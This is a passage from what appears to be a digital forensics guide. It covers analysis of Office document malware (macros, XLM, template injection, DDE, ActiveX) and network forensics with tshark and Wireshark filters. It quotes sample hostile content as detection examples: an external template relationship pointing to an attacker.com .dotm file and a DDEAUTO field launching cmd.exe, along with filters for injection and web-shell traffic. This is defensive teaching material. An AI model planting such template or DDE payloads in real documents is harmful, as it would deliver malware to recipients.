olevba document.docm | wc -l
pcodedmp.py word/vbaProject.bin | wc -l

# Significant discrepancy suggests stomping
```

### Excel 4.0 Macros (XLM Macros)

Older macro format stored in sheet cells, harder to detect.

```bash
# olevba supports XLM extraction
olevba --deobf spreadsheet.xls | grep -A 10 "XLM"

# XLMMacroDeobfuscator (specialized tool)
xlmdeobfuscator --file spreadsheet.xlsm

# Manual inspection - look for defined names
unzip -p spreadsheet.xlsm xl/workbook.xml | grep "definedName"

# XLM macros often use:
# - Auto_Open cells
# - Hidden sheets
# - EXEC, CALL, REGISTER functions
```

### Template Injection Detection

Attackers can modify document templates to point to remote locations hosting malicious content.

```bash
# Extract settings.xml (contains template reference)
unzip -p document.docx word/_rels/settings.xml.rels | xmllint --format -

# Look for external template relationships
grep "attachedTemplate" <(unzip -p document.docx word/_rels/settings.xml.rels)

# Example malicious template:
# <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://attacker.com/evil.dotm" TargetMode="External"/>

# Automated check
unzip -p document.docx word/_rels/settings.xml.rels 2>/dev/null | \
    grep -o 'Target="http[^"]*"' | \
    grep -v "schemas.openxmlformats.org\|schemas.microsoft.com"
```

### DDE (Dynamic Data Exchange) Exploitation

```bash
# Search for DDE fields in document body
unzip -p document.docx word/document.xml | grep -i "ddeauto"

# Format DDE typically looks like:
# <w:fldChar w:fldCharType="begin"/>
# <w:instrText> DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"</w:instrText>
# <w:fldChar w:fldCharType="end"/>

# Automated DDE detection
unzip -p document.docx word/document.xml | \
    grep -oP '<w:instrText[^>]*>\K[^<]+' | \
    grep -iE "dde|ddeauto"
```

### ActiveX Control Analysis

```bash
# ActiveX controls stored in activeX/ directory
unzip -l document.docx | grep activeX

# Extract control binaries
unzip document.docx -d extracted/
ls extracted/word/activeX/

# Analyze with file command
file extracted/word/activeX/*.bin

# Many ActiveX controls are OLE2 compound files
oledump.py extracted/word/activeX/activeX1.bin
```

### Custom XML Data Extraction

```bash
# Custom XML parts (can hide data)
unzip -l document.docx | grep customXml

# Extract and examine
unzip document.docx customXml/item1.xml -d extracted/
xmllint --format extracted/customXml/item1.xml

# Check for Base64 or encoded content
grep -r "encoding\|base64" extracted/customXml/

# Custom XML can store arbitrary data invisible to normal users
```

### Document Forensics Automation Script

```python
#!/usr/bin/env python3
# ooxml_forensics.py

import zipfile
import xml.etree.ElementTree as ET
import sys
import re
from pathlib import Path

def analyze_ooxml(filepath):
    """Comprehensive OOXML document analysis"""
    
    findings = []
    
    try:
        with zipfile.ZipFile(filepath, 'r') as zf:
            namelist = zf.namelist()
            
            # Check for macros
            if any('vbaProject.bin' in name for name in namelist):
                findings.append("[WARNING] Document contains VBA macros")
            
            # Check for external relationships
            for relfile in [n for n in namelist if n.endswith('.rels')]:
                content = zf.read(relfile).decode('utf-8', errors='ignore')
                if 'TargetMode="External"' in content:
                    # Extract URLs
                    urls = re.findall(r'Target="(http[^"]+)"', content)
                    for url in urls:
                        findings.append(f"[EXTERNAL] {relfile}: {url}")
            
            # Check for ActiveX controls
            if any('activeX' in name for name in namelist):
                findings.append("[WARNING] Document contains ActiveX controls")
            
            # Check for DDE
            if 'word/document.xml' in namelist:
                doc_xml = zf.read('word/document.xml').decode('utf-8', errors='ignore')
                if re.search(r'ddeauto|dde', doc_xml, re.IGNORECASE):
                    findings.append("[CRITICAL] DDE fields detected")
            
            # Check for template injection
            if 'word/_rels/settings.xml.rels' in namelist:
                settings = zf.read('word/_rels/settings.xml.rels').decode('utf-8', errors='ignore')
                external_templates = re.findall(r'attachedTemplate.*Target="([^"]+)".*External', settings)
                for template in external_templates:
                    findings.append(f"[CRITICAL] External template: {template}")
            
            # Check for custom XML (potential data hiding)
            if any('customXml' in name for name in namelist):
                findings.append("[INFO] Custom XML data present")
            
    except Exception as e:
        findings.append(f"[ERROR] Analysis failed: {str(e)}")
    
    return findings

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: ooxml_forensics.py <document>")
        sys.exit(1)
    
    filepath = sys.argv[1]
    print(f"Analyzing: {filepath}\n")
    
    findings = analyze_ooxml(filepath)
    
    if findings:
        for finding in findings:
            print(finding)
    else:
        print("[OK] No suspicious indicators found")
```

**Related Important Topics:**
- **OLE2 Property Sets**: Additional metadata storage in legacy Office files
- **File Format Fuzzing**: Creating malformed documents for vulnerability research
- **Anti-Analysis Techniques**: Password protection, encryption, detection evasion in documents

---

# Network Forensics

## PCAP File Analysis

PCAP (Packet Capture) files contain recorded network traffic for forensic examination. Analysis reveals communication patterns, data exfiltration, malware command-and-control activity, and protocol violations.

**PCAP File Formats**

**PCAP** - original format created by libpcap library. Contains packet data with timestamps and capture metadata. Maximum file size limited by 32-bit offset fields.

**PCAP-NG** - next generation format supporting multiple interfaces, enhanced timestamps, and embedded metadata. More flexible but less universal tool support.

File structure:

- Global header containing capture parameters
- Packet headers with timestamp, captured length, and original length
- Packet data (raw bytes from network interface)

**Initial PCAP Examination**

Identify basic capture characteristics before deep analysis:

```bash
capinfos capture.pcap
```

Output provides:

- File type and format version
- Capture duration (start and end times)
- Total packet count
- Data byte count
- Average packets per second
- Average bits per second
- Capture interface type
- Packet size distribution

Example output analysis:

```
File size:           524288000 bytes
Data size:           518342156 bytes
Capture duration:    3600.245 seconds
Start time:          2024-10-12 08:15:32
End time:            2024-10-12 09:15:32
Packets:             2847291 packets
Average packet rate: 791 packets/sec
Average data rate:   1152 kbit/s
```

High packet rate with low data rate suggests small packets - possibly DDoS activity or scanning. High data rate suggests bulk transfer - file downloads or data exfiltration.

**Quick Statistics Generation**

```bash
tshark -r capture.pcap -q -z io,phs
```

Protocol hierarchy statistics show percentage breakdown:

- Layer 2 protocols (Ethernet, WiFi)
- Layer 3 protocols (IPv4, IPv6, ARP)
- Layer 4 protocols (TCP, UDP, ICMP)
- Application protocols (HTTP, DNS, TLS, SSH)

Unexpected protocols warrant investigation. SSH on non-standard ports, unusual DNS query volumes, or rare protocols might indicate malicious activity.

**Conversation Analysis**

Identify top talkers - hosts generating most traffic:

```bash
tshark -r capture.pcap -q -z conv,ip
```

Shows IP conversations with packet counts and byte totals. External IPs communicating with many internal hosts suggest scanning or C2 activity.

```bash
tshark -r capture.pcap -q -z conv,tcp
```

TCP conversations include port numbers. Multiple connections to single destination port from various sources suggests server activity. Single source connecting to many destination ports suggests port scanning.

**Endpoint Statistics**

```bash
tshark -r capture.pcap -q -z endpoints,ip
```

Lists all IP addresses with transmit/receive statistics. Identifies:

- Most active internal hosts
- External IPs communicating with network
- Potential data exfiltration (high outbound traffic from single host)
- Potential C2 servers (regular small communications)

**DNS Query Analysis**

```bash
tshark -r capture.pcap -q -z dns,tree
```

Shows DNS query statistics:

- Most queried domains
- DNS response codes
- Query types (A, AAAA, MX, TXT, etc.)

Excessive failed queries (NXDOMAIN) might indicate DGA (Domain Generation Algorithm) malware. Unusual TXT record queries might indicate DNS tunneling.

**HTTP Statistics**

```bash
tshark -r capture.pcap -q -z http,tree
```

Breaks down HTTP traffic by:

- Request methods (GET, POST, PUT, DELETE)
- Response codes (200, 404, 500, etc.)
- Host headers
- User agents

Multiple 404 responses suggest web scanning. Unusual user agents might indicate malware or automated tools.

**File Extraction from PCAP**

Export objects transferred via HTTP:

```bash
tshark -r capture.pcap --export-objects http,extracted_files/
```

Creates directory containing all HTTP-transferred files with sanitized filenames based on URLs. Examine extracted executables, documents, and archives for malware.

FTP file extraction:

```bash
tshark -r capture.pcap --export-objects ftp-data,extracted_ftp_files/
```

SMB file extraction:

```bash
tshark -r capture.pcap --export-objects smb,extracted_smb_files/
```

**Timeline Generation**

Create chronological event list:

```bash
tshark -r capture.pcap -T fields -e frame.time -e ip.src -e ip.dst -e tcp.dstport -e http.request.uri > timeline.txt
```

Sort and analyze temporal patterns. Identify:

- Initial compromise timestamp
- Regular beaconing intervals
- Data staging and exfiltration times
- Attack progression timeline

**PCAP Splitting and Filtering**

Large PCAP files challenge analysis tools. Split by time or size:

```bash
editcap -i 3600 large_capture.pcap split_hourly.pcap
```

Splits into one-hour segments.

Filter PCAP to create focused subsets:

```bash
tshark -r capture.pcap -Y "ip.addr == 192.168.1.50" -w suspicious_host.pcap
```

Creates new PCAP containing only traffic involving specific IP.

**Packet Count and Size Analysis**

```bash
tshark -r capture.pcap -q -z plen,tree
```

Packet length distribution reveals traffic patterns:

- Many small packets: control traffic, scanning, or fragmentation attacks
- Large packets: bulk data transfer or legitimate application traffic
- Uniform packet sizes: potential covert channel or protocol tunneling

**Unusual Protocol Detection**

```bash
tshark -r capture.pcap -q -z io,phs -Y "not (tcp or udp or icmp or arp or dns)"
```

Lists non-standard protocols. Investigate unexpected protocols:

- GRE or IP-in-IP tunnels (might hide malicious traffic)
- Custom protocols (potential malware C2)
- Uncommon routing protocols (might indicate network reconnaissance)

## Wireshark Filtering Techniques

Wireshark display filters enable focused analysis by showing only relevant packets. Filters use comparison operators and logical combiners to create complex selection criteria.

**Display Filters vs. Capture Filters**

**Display filters** apply to captured traffic in Wireshark GUI or via tshark `-Y` flag. Filter already-captured packets for analysis. More flexible and feature-rich.

**Capture filters** use BPF (Berkeley Packet Filter) syntax during live capture via tshark `-f` flag or tcpdump. Reduce capture file size by excluding irrelevant traffic. Less flexible but more efficient.

**Basic Display Filter Syntax**

Protocol field comparison:

```
ip.addr == 192.168.1.50
```

Shows packets with source or destination IP 192.168.1.50.

Specific direction:

```
ip.src == 192.168.1.50
ip.dst == 10.0.0.1
```

Port filtering:

```
tcp.port == 80
tcp.dstport == 443
udp.port == 53
```

**Comparison Operators**

- `==` equal to
- `!=` not equal to
- `>` greater than
- `<` less than
- `>=` greater than or equal
- `<=` less than or equal

Integer field comparison:

```
tcp.dstport > 1024
ip.ttl < 64
frame.len > 1500
```

**Logical Operators**

- `and` or `&&` - both conditions must be true
- `or` or `||` - either condition must be true
- `not` or `!` - condition must be false

Combined filters:

```
ip.src == 192.168.1.50 and tcp.dstport == 80
tcp.port == 80 or tcp.port == 443
not arp and not dns
```

Parentheses group conditions:

```
(ip.src == 192.168.1.50 or ip.src == 192.168.1.51) and tcp.dstport == 443
```

**String Matching Filters**

Contains operator for partial matches:

```
http.host contains "evil"
dns.qry.name contains "malware"
```

Case-insensitive matching:

```
http.user_agent matches "(?i)bot"
```

Exact string match:

```
http.request.uri == "/admin/login.php"
```

**Protocol-Specific Filters**

**TCP Flags:**

```
tcp.flags.syn == 1 and tcp.flags.ack == 0
tcp.flags.reset == 1
tcp.flags.fin == 1
```

SYN scan detection (SYN without ACK):

```
tcp.flags.syn == 1 and tcp.flags.ack == 0 and tcp.window_size <= 1024
```

**TCP Stream Following:**

```
tcp.stream eq 42
```

Shows all packets in specific TCP stream. Right-click packet → Follow → TCP Stream to identify stream number.

**HTTP Filters:**

```
http.request.method == "POST"
http.response.code == 404
http.request.uri contains "/admin"
http.user_agent contains "python"
```

**DNS Filters:**

```
dns.qry.name == "evil.com"
dns.flags.response == 1
dns.flags.rcode != 0
```

DNS tunneling detection (large TXT records):

```
dns.qry.type == 16 and dns.resp.len > 100
```

**TLS/SSL Filters:**

```
ssl.handshake.type == 1
tls.handshake.extensions_server_name contains "malware"
```

**ICMP Filters:**

```
icmp.type == 8
icmp.type == 0
```

Type 8 is echo request (ping), type 0 is echo reply.

**Advanced Filter Techniques**

**Subnet Filtering:**

```
ip.addr == 192.168.1.0/24
```

Shows all traffic in 192.168.1.0/24 subnet.

**Time-Based Filtering:**

```
frame.time >= "2024-10-12 08:00:00" and frame.time <= "2024-10-12 09:00:00"
```

**Packet Size Filtering:**

```
frame.len > 1500
tcp.len > 0
```

`tcp.len > 0` excludes TCP control packets (ACK, SYN) with no payload.

**MAC Address Filtering:**

```
eth.addr == 00:11:22:33:44:55
```

**VLAN Filtering:**

```
vlan.id == 100
```

**Filter Macros for Common Patterns**

**Web Browsing Traffic:**

```
tcp.port == 80 or tcp.port == 443 or tcp.port == 8080
```

**Email Traffic:**

```
tcp.port == 25 or tcp.port == 110 or tcp.port == 143 or tcp.port == 587 or tcp.port == 993 or tcp.port == 995
```

**File Sharing:**

```
tcp.port == 445 or tcp.port == 139 or tcp.port == 21
```

**Database Traffic:**

```
tcp.port == 3306 or tcp.port == 5432 or tcp.port == 1433
```

**Suspicious Activity Filters**

**Non-Standard Ports for Common Services:**

```
(http.request or ssl.handshake.type == 1) and not (tcp.port == 80 or tcp.port == 443 or tcp.port == 8080 or tcp.port == 8443)
```

**Large Data Transfers:**

```
tcp.len > 10000
```

**Failed Connections:**

```
tcp.flags.reset == 1 or tcp.flags.fin == 1
```

**Port Scanning Detection:**

```
tcp.flags.syn == 1 and tcp.flags.ack == 0
```

Count unique destination ports from single source.

**Beaconing Detection:**

Regular interval connections suggest C2 beaconing. Filter traffic from suspicious host:

```
ip.src == 192.168.1.50
```

Then analyze timing patterns in Statistics → Flow Graph.

**Data Exfiltration Indicators:**

```
ip.src == 192.168.1.0/24 and frame.len > 1400 and tcp.dstport > 1024
```

Large outbound packets to non-standard ports might indicate data theft.

**DNS Tunneling Detection:**

```
dns.qry.name.len > 50
```

Excessively long DNS queries suggest data encoding in domain names.

**Filter Performance Optimization**

Specific filters process faster than broad filters. Use:

```
ip.src == 192.168.1.50 and tcp.dstport == 80
```

Instead of:

```
ip.addr == 192.168.1.0/24 and tcp.port == 80
```

Protocol filters before string matching improves performance:

```
http and http.host contains "evil"
```

Faster than:

```
http.host contains "evil"
```

**Saving and Applying Filters**

Save frequently-used filters as bookmarks in Wireshark. Access via Bookmarks menu or create filter buttons for one-click application.

Export filtered packets to new PCAP:

```bash
tshark -r capture.pcap -Y "ip.addr == 192.168.1.50" -w filtered.pcap
```

**Filter Negation Patterns**

Exclude broadcast and multicast:

```
not broadcast and not multicast
```

Exclude specific protocols:

```
not arp and not dns and not icmp
```

Exclude internal traffic:

```
not (ip.src == 192.168.0.0/16 and ip.dst == 192.168.0.0/16)
```

**Combining Filters with Statistics**

Apply filter then generate statistics on filtered set:

```bash
tshark -r capture.pcap -Y "http.request.method == POST" -q -z http,tree
```

Shows statistics only for HTTP POST requests.

**Regular Expression Filters**

Pattern matching in text fields:

```
http.host matches "^[a-z0-9]{8,20}\\.(com|net|org)$"
```

Detects domains with random-looking names (potential DGA domains).

```
dns.qry.name matches "[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+\\.in-addr\\.arpa"
```

Identifies reverse DNS lookups.

## Protocol Analysis (TCP/IP, HTTP, DNS, FTP)

Protocol analysis examines network communication adherence to standards, identifies anomalies, and reveals application-layer activities. Understanding protocol structure enables detection of violations and malicious behavior.

**TCP/IP Protocol Analysis**

**TCP Three-Way Handshake**

Normal connection establishment:

1. Client → Server: SYN (Synchronize sequence number)
2. Server → Client: SYN-ACK (Synchronize + Acknowledge)
3. Client → Server: ACK (Acknowledge)

Filter to view handshake:

```
tcp.flags.syn == 1 or (tcp.flags.syn == 1 and tcp.flags.ack == 1)
```

**Handshake Anomalies:**

**SYN Flood Attack** - many SYN packets without corresponding ACKs:

```
tcp.flags.syn == 1 and tcp.flags.ack == 0
```

Count unique destination IPs. Single destination receiving SYNs from many sources indicates attack.

**Connection Refused** - Server responds with RST (reset) instead of SYN-ACK:

```
tcp.flags.reset == 1
```

Indicates closed port or firewall blocking.

**Incomplete Handshakes** - SYN with no response suggests:

- Filtered port (firewall drops packets silently)
- Non-existent host
- Network routing issue

**TCP Sequence and Acknowledgment Analysis**

Sequence numbers track data bytes. Each packet increments sequence by payload length. Acknowledgment numbers indicate next expected byte.

**TCP Retransmissions** suggest network issues or packet loss:

```
tcp.analysis.retransmission
```

High retransmission rate indicates:

- Network congestion
- Faulty hardware
- Packet manipulation/injection

**Duplicate ACKs** trigger fast retransmit:

```
tcp.analysis.duplicate_ack
```

Three duplicate ACKs cause sender to retransmit without waiting for timeout.

**Out-of-Order Packets:**

```
tcp.analysis.out_of_order
```

Normal in lossy networks but excessive disorder suggests routing problems or tampering.

**TCP Window Size Analysis**

Window size controls flow control - receiver advertises buffer capacity. Zero window means receiver cannot accept more data.

```
tcp.window_size == 0
```

**Window size anomalies:**

- Very small windows (<1460 bytes): potential performance issue or covert channel
- Sudden drops to zero: application not reading data fast enough
- Window scale option manipulation: potential fingerprinting evasion

**TCP Flags Combinations**

Valid combinations:

- SYN (new connection)
- SYN-ACK (connection acceptance)
- ACK (acknowledgment)
- PSH-ACK (push data)
- FIN-ACK (close connection)
- RST (abort connection)

Invalid/suspicious combinations:

- SYN-FIN: nonsensical, used in some OS fingerprinting
- All flags set (XMAS scan)
- No flags set (NULL scan)
- SYN-RST: impossible combination

Filter for unusual flag combinations:

```
tcp.flags == 0x00
tcp.flags == 0x3f
tcp.flags.syn == 1 and tcp.flags.fin == 1
```

**IP Protocol Analysis**

**TTL (Time to Live) Analysis**

TTL decrements at each router hop. Initial values are typically 64, 128, or 255 depending on OS.

```
ip.ttl < 64
```

Low TTL suggests:

- Many hops (geographically distant)
- TTL manipulation
- Potential spoofing

**TTL consistency** - traffic from same source should have consistent TTL (±1-2). Significant variations suggest:

- Multiple routes (load balancing)
- IP spoofing
- Multiple systems behind NAT with different initial TTLs

**IP Fragmentation**

Large packets exceed MTU (typically 1500 bytes) and fragment:

```
ip.flags.mf == 1 or ip.frag_offset > 0
```

**Fragmentation attacks:**

- **Teardrop**: overlapping fragments crash vulnerable systems
- **Fragment flooding**: excessive fragments overwhelm reassembly buffers
- **Tiny fragments**: fragment headers to evade inspection

Modern networks typically avoid fragmentation via Path MTU Discovery. Excessive fragmentation warrants investigation.

**IP Options Analysis**

Rarely used IP options might indicate reconnaissance:

```
ip.options
```

- Record Route: tracks routing path
- Timestamp: records timing at routers
- Loose/Strict Source Routing: specifies routing path

Attackers use IP options for:

- Network mapping
- Firewall evasion
- Covert channels

**HTTP Protocol Analysis**

HTTP is text-based request-response protocol. Version 1.1 includes persistent connections and chunked encoding.

**HTTP Request Analysis**

Request structure:

```
METHOD /path HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
[other headers]

[optional body]
```

**Request Methods:**

- GET: retrieve resource
- POST: submit data
- PUT: upload resource
- DELETE: remove resource
- HEAD: retrieve headers only
- OPTIONS: query supported methods

Filter by method:

```
http.request.method == "POST"
```

**Suspicious HTTP Patterns:**

**Directory Traversal Attempts:**

```
http.request.uri contains "../"
```

**SQL Injection Attempts:**

```
http.request.uri contains "union" or http.request.uri contains "select"
```

**Command Injection:**

```
http.request.uri contains ";" or http.request.uri contains "|"
```

**Web Shell Upload Attempts:**

```
http.request.method == "POST" and http.content_type contains "multipart/form-data"
```

Check for file uploads with suspicious extensions (.php, .jsp, .asp).

**Unusual User Agents:**

```
http.user_agent
```

- Automated scanners (Nikto, sqlmap, Burp Suite)
- Malware C2 communications (often use generic or absent user agents)
- Custom scripts (python-requests, curl, wget)

**HTTP Response Analysis**

Response structure:

```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1234
[other headers]

[body]
```

**Response Codes:**

- 1xx: Informational
- 2xx: Success (200 OK, 201 Created)
- 3xx: Redirection (301 Moved, 302 Found)
- 4xx: Client Error (404 Not Found, 403 Forbidden)
- 5xx: Server Error (500 Internal Server Error)

**Forensic Indicators:**

**404 Patterns** - Many 404s suggest scanning:

```
http.response.code == 404
```

Count unique requested URIs from single source.

**403 Forbidden** - Attempts to access restricted resources:

```
http.response.code == 403
```

**500 Errors** - Might indicate successful exploitation triggering crashes:

```
http.response.code == 500
```

**Hidden Data in HTTP**

POST body examination:

```
http.request.method == "POST"
```

Right-click packet → Follow → HTTP Stream to view full request/response including POST data.

**HTTP Response Content:**

Extract files via File → Export Objects → HTTP

Examine for:

- Malicious JavaScript
- Exploit kits
- Phishing content
- Malware downloads

**DNS Protocol Analysis**

DNS translates domain names to IP addresses. Operates primarily over UDP port 53, falls back to TCP for large responses.

**DNS Query Structure**

Query packet contains:

- Transaction ID (matches response to request)
- Flags (query vs. response, recursion desired, etc.)
- Question section (domain name and query type)
- Optional additional sections

**Query Types:**

- A: IPv4 address
- AAAA: IPv6 address
- MX: Mail exchanger
- NS: Name server
- CNAME: Canonical name (alias)
- TXT: Text records
- PTR: Reverse lookup (IP to name)

Filter by query type:

```
dns.qry.type == 1
```

(Type 1 is A record)

**DNS Response Analysis**

Response includes:

- Same transaction ID as query
- Answer section with resolved data
- Authority section with authoritative name servers
- Additional section with supplementary records

**Response Codes (RCODE):**

- 0: No error
- 1: Format error
- 2: Server failure
- 3: NXDOMAIN (non-existent domain)
- 5: Refused

Filter for failures:

```
dns.flags.rcode != 0
```

**DNS-Based Attacks and Anomalies**

**DGA (Domain Generation Algorithm) Detection**

Malware generates random-looking domains for C2. Indicators:

- Long domain names: `dns.qry.name.len > 20`
- High entropy (random character distribution)
- Many NXDOMAIN responses: `dns.flags.rcode == 3`
- Unusual TLDs (.top, .xyz, .info used by some DGA)

**DNS Tunneling Detection**

Encodes data in DNS queries/responses to bypass firewalls.

Indicators:

- Unusually long queries: `dns.qry.name.len > 50`
- High query volume to single domain
- Large TXT record responses: `dns.qry.type == 16 and dns.resp.len > 100`
- Queries with base64-like subdomains

**DNS Cache Poisoning**

Attacker injects false DNS responses. Detection:

- Multiple responses with same transaction ID but different IPs
- Unsolicited DNS responses (response without matching query)

**Fast-Flux Detection**

Attackers rapidly change DNS records to evade blocklists. Detection:

- Very short TTL values: `dns.resp.ttl < 300`
- Multiple A records with different IPs
- Frequent queries to same domain with changing results

**DNS Query Volume Analysis**

```bash
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head -20
```

Lists top 20 most-queried domains. Unusual domains with high query counts warrant investigation.

**FTP Protocol Analysis**

FTP uses two connections - control channel (port 21) and data channel (port 20 for active mode or ephemeral port for passive mode).

**FTP Control Channel**

Text-based commands and responses:

**Common Commands:**

- USER: username
- PASS: password (sent in cleartext)
- LIST: list directory
- RETR: retrieve file
- STOR: store file
- DELE: delete file
- PWD: print working directory
- CWD: change working directory

**Response Codes:**

- 1xx: Positive preliminary
- 2xx: Positive completion (220 Service ready, 230 User logged in)
- 3xx: Positive intermediate (331 Username OK, need password)
- 4xx: Transient negative (450 File unavailable)
- 5xx: Permanent negative (530 Login incorrect)

Filter FTP control:

```
ftp
```

**FTP Security Issues**

**Cleartext Credentials:**

```
ftp.request.command == "USER" or ftp.request.command == "PASS"
```

Follow TCP stream to extract username and password.

**Anonymous FTP:**

```
ftp.request.command == "USER" and ftp.request.arg == "anonymous"
```

Check if anonymous access allows file uploads to writable directories.

**FTP Data Channel Analysis**

Actual file transfers occur on data channel. Extract transferred files:

```bash
tshark -r capture.pcap --export-objects ftp-data,ftp_files/
```

**Active vs. Passive Mode**

**Active Mode:**

- Client opens random port and sends PORT command with IP and port
- Server connects back from port 20 to client's specified port

Filter:

```
ftp.request.command == "PORT"
```

**Passive Mode:**

- Client sends PASV command
- Server opens random port and sends IP and port to client
- Client connects to server's specified port

Filter:

```
ftp.request.command == "PASV"
```

Passive mode more common due to NAT and firewall traversal.

**FTP Bounce Attack Detection**

Attacker uses FTP server to scan ports on third-party hosts. Detection:

```
ftp.request.command == "PORT"
```

Examine PORT command argument. If IP address differs from client IP, potential bounce attack.

## Traffic Reconstruction

Traffic reconstruction reassembles communication sessions from packet captures to reveal complete conversations, transferred files, and application-layer activities.

**TCP Stream Reassembly**

TCP breaks data into segments transmitted in packets. Reconstruction reassembles segments into original data stream using sequence numbers.

**Wireshark Stream Following**

Right-click any TCP packet → Follow → TCP Stream

Displays entire bidirectional conversation with:

- Client data in red
- Server data in blue
- Raw, ASCII, EBCDIC, or hex dump views

Save stream to file: Save As button in stream window

**Command-Line Stream Extraction**

```bash
tshark -r capture.pcap -z follow,tcp,ascii,0
```

Follows TCP stream 0 in ASCII format. Stream numbers start at 0.

Extract specific stream to file:

```bash
tshark -r capture.pcap -Y "tcp.stream eq 42" -T fields -e tcp.payload | xxd -r -p > stream_42.bin
```

**Bulk Stream Extraction**

Extract all TCP streams:

```bash
for stream in $(tshark -r capture.pcap -T fields -e tcp.stream | sort -n | uniq); do
    tshark -r capture.pcap -Y "tcp.stream eq $stream" -T fields -e tcp.payload | xxd -r -p > stream_$stream.bin
done
```

**HTTP Session Reconstruction**

HTTP sessions often span multiple TCP connections (especially HTTP/1.0). Reconstruct complete session by:

1. Identify user by IP or session cookie
2. Filter traffic: `ip.src == 192.168.1.50 and http`
3. Sort by timestamp
4. Follow each TCP stream showing HTTP activity

**HTTP Object Extraction**

```bash
tshark -r capture.pcap --export-objects http,http_objects/
```

Extracts all HTTP-transferred files preserving original filenames where possible.

**Manual HTTP Reconstruction**

For damaged or unusual HTTP:

1. Filter HTTP requests: `http.request`
2. Note request URI and Host header
3. Find corresponding response: next packet in same TCP stream
4. Extract response body from Content-Length header
5. Decode if Transfer-Encoding: chunked or Content-Encoding: gzip

**Email Session Reconstruction**

**SMTP Reconstruction:**

```
tcp.port == 25
```

Follow TCP stream shows complete email including:

- MAIL FROM: sender
- RCPT TO: recipients
- DATA: message content

**POP3 Reconstruction:**

```
tcp.port == 110
```

Shows USER, PASS, RETR (retrieve messages), and DELE (delete) commands.

**IMAP Reconstruction:**

```
tcp.port == 143
```

More complex than POP3 with mailbox operations, searching, and partial message retrieval.

Extract email content from SMTP/POP3/IMAP streams, then parse MIME format for attachments.

**FTP Session Reconstruction**

FTP uses separate control and data channels requiring reconstruction of both:

1. Follow FTP control channel (port 21):

```
tcp.port == 21
```

Reveals commands, authentication, and data channel negotiation.

2. Identify data channel from PASV response or PORT command
3. Follow data channel TCP stream
4. Extract file data

Automated extraction:

```bash
tshark -r capture.pcap --export-objects ftp-data,ftp_files/
```

**DNS Transaction Reconstruction**

DNS uses UDP typically, making reassembly unnecessary. However, TCP-based DNS (for large responses) requires stream following.

Reconstruct DNS activity timeline:

```bash
tshark -r capture.pcap -Y "dns" -T fields -e frame.time -e ip.src -e dns.qry.name -e dns.resp.addr
```

Shows query timing, source IP, queried domain, and resolved IP.

**TLS Session Reconstruction**

Encrypted TLS traffic requires decryption for content reconstruction. Methods:

**With Private Key:**

If server private key available: Preferences → Protocols → TLS → RSA Keys List → Add private key

[Inference] This only works for RSA key exchange, not Diffie-Hellman (DHE/ECDHE) cipher suites which provide forward secrecy.

**With Pre-Master Secret:**

If client can export session keys (via SSLKEYLOGFILE environment variable): Preferences → Protocols → TLS → (Pre)-Master-Secret log filename

Points to file containing session keys for decryption.

**Without Keys:**

Only metadata analysis possible:

- TLS handshake details
- Certificate information
- Connection timing
- Traffic volume

**VoIP Call Reconstruction**

**SIP Signaling Analysis:**

```
sip
```

Reveals call setup, participants, codecs negotiated.

**RTP Media Reconstruction:**

Telephony → RTP → RTP Streams

Select stream → Analyze → Play Streams

Reconstructs and plays audio from VoIP calls.

Save audio: Player window → Save As WAV

**Multi-Protocol Session Reconstruction**

Complex applications use multiple protocols. Reconstruct by:

1. Identify starting event (often DNS query or initial HTTP request)
2. Follow protocol chain:
    - DNS lookup
    - TCP handshake
    - TLS negotiation
    - Application protocol (HTTP, etc.)
3. Track session identifiers (cookies, session IDs)
4. Correlate across multiple TCP streams

**Example web application session:**

1. DNS query for example.com
2. TCP handshake to resolved IP
3. TLS handshake
4. HTTP GET /login
5. HTTP POST /login with credentials
6. HTTP GET /dashboard with session cookie
7. HTTP POST /upload with multipart data
8. Additional HTTP requests using same session cookie

**Incomplete Stream Handling**

Missing packets prevent complete reconstruction. Indicators:

- TCP Previous segment not captured
- TCP ACKed unseen segment
- Gaps in sequence numbers

Partial reconstruction still provides valuable information. Document gaps and explain limitations in findings.

**Stream Carving**

When TCP reassembly fails, carve data manually:

1. Filter packets in stream: `tcp.stream eq N`
2. Extract payload bytes
```bash
tshark -r capture.pcap -Y "tcp.stream eq 42" -T fields -e tcp.payload | tr -d '\n' | xxd -r -p > carved_stream.bin
```
3. Analyze carved data with file command and hex editor
4. Identify file signatures (magic bytes) within stream
5. Extract files based on headers and known formats

**Timeline-Based Reconstruction**

Create comprehensive timeline correlating multiple protocols:

```bash
tshark -r capture.pcap -T fields -e frame.time -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport -e _ws.col.Protocol -e _ws.col.Info | sort
```

Reveals attack progression, lateral movement, and data exfiltration sequences.

**Statistical Reconstruction**

When content unavailable (encryption), reconstruct activity patterns from metadata:

- Connection timing and duration
- Data volume per connection
- Connection frequency and regularity
- Protocol distribution changes over time

## Network Stream Extraction

Stream extraction isolates specific communication flows from packet captures for detailed analysis. Unlike reconstruction which reassembles protocols, extraction provides raw data for custom processing.

**TCP Stream Identification**

Each TCP connection receives unique stream index. Identify streams:

```bash
tshark -r capture.pcap -T fields -e tcp.stream | sort -n | uniq
```

Lists all stream numbers present in capture.

Count packets per stream:

```bash
tshark -r capture.pcap -T fields -e tcp.stream | sort -n | uniq -c
```

High packet counts suggest significant data transfer warranting investigation.

**Extract Specific Stream**

```bash
tshark -r capture.pcap -Y "tcp.stream eq 42" -w stream_42.pcap
```

Creates new PCAP containing only packets from stream 42.

**Extract Stream Payload**

Raw payload bytes without TCP/IP headers:

```bash
tshark -r capture.pcap -Y "tcp.stream eq 42" -T fields -e tcp.payload | xxd -r -p > stream_42_payload.bin
```

Process:

- `-T fields -e tcp.payload` outputs hex-encoded payload
- `xxd -r -p` converts hex to binary
- Result is raw application data

**Directional Stream Extraction**

Extract only client-to-server data:

```bash
tshark -r capture.pcap -Y "tcp.stream eq 42 and ip.src == 192.168.1.50" -T fields -e tcp.payload | xxd -r -p > client_data.bin
```

Extract only server-to-client data:

```bash
